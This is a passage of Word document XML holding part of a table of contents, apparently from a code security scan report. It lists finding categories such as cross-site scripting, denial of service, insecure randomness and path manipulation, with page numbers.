            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039306 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>35</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3401FAA9" w14:textId="4A8D143E" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039307" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.4.2.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Cross-Site Request Forgery</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039307 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>35</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4AF9F9C3" w14:textId="25234C17" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039308" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.4.3.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Cross-Site Scripting</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039308 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>37</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="72EF9BE8" w14:textId="7881D302" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039309" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.4.4.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Cross-Site Scripting: DOM</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039309 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>38</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6D3D0CF6" w14:textId="722B2402" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039310" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.4.5.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Cross-Site Scripting: Self</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039310 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>39</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5A2738F8" w14:textId="453459AD" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039311" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.4.6.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Dead Code: Expression is Always true</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039311 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>40</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2DC168D2" w14:textId="700FB8DC" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039312" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.4.7.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Denial of Service</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039312 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>41</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6FDF1B40" w14:textId="0CC10AD0" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039313" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.4.8.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Denial of Service: StringBuilder</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039313 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>44</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5D2553B8" w14:textId="4FBB4B61" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039314" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.4.9.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Insecure Randomness</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039314 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>45</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7C09A237" w14:textId="4ADAE1B4" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039315" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.4.10.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Missing Check against Null</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039315 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>47</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="18A11929" w14:textId="2E7DC8C6" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039316" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.4.11.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>No database password was set</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039316 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>47</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="774EF310" w14:textId="52B3C162" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039317" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.4.12.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Password Management: Password in Comment</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039317 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>48</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2ACF9D5B" w14:textId="2C9006C8" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039318" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.4.13.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Path Manipulation</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039318 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>48</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="79D47F4D" w14:textId="7C331564" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039319" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.4.14.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Path Manipulation: Zip Entry Overwrite</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039319 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>50</w:t>
            </w:r>
